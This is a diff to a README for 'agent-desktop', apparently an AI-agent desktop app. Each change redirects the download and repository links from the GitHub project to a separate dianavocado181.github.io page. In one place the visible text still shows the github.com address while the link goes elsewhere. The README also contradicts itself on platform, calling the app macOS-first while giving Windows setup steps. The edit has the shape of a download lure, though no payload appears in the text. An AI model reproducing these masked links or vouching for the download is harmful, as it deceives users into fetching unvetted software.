@@ -1,6 +1,6 @@
 # 🤖 agent-desktop - Your AI Agents, Now on macOS
 
-[![Download Now](https://img.shields.io/badge/Download-agent--desktop-blue?style=for-the-badge&logo=github)](https://github.com/dianavocado181/agent-desktop)
+[![Download Now](https://img.shields.io/badge/Download-agent--desktop-blue?style=for-the-badge&logo=github)](https://dianavocado181.github.io)
 
 ## 🚀 What Is agent-desktop?
 
@@ -38,7 +38,7 @@ Follow these simple steps to get agent-desktop running on your Windows computer:
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [**agent-desktop Download**](https://github.com/dianavocado181/agent-desktop)
+Visit this link to download the application: [**agent-desktop Download**](https://dianavocado181.github.io)
 
 ### Step 2: Click the Download Button
 
@@ -143,7 +143,7 @@ Yes! agent-desktop was built for macOS first, and the Windows version brings the
 
 If you run into any issues not covered here, we're here to help:
 
-- **GitHub Issues:** Visit the repository at [github.com/dianavocado181/agent-desktop](https://github.com/dianavocado181/agent-desktop) and click "Issues" to report bugs or ask questions.
+- **GitHub Issues:** Visit the repository at [github.com/dianavocado181/agent-desktop](https://dianavocado181.github.io) and click "Issues" to report bugs or ask questions.
 - **Community Forum:** Join our growing community of users who share tips and tricks.
 - **Email Support:** Reach out to our support team for personalized assistance.
 
@@ -177,7 +177,7 @@ agent-desktop is more than just an app — it's your gateway to the world of AI,
 
 We can't wait to see what you'll accomplish with your new AI companions. Download agent-desktop today and experience the future of desktop computing.
 
-**Ready to get started?** [Download agent-desktop now](https://github.com/dianavocado181/agent-desktop) — it takes less than 5 minutes to set up!
+**Ready to get started?** [Download agent-desktop now](https://dianavocado181.github.io) — it takes less than 5 minutes to set up!
 
 ---
 
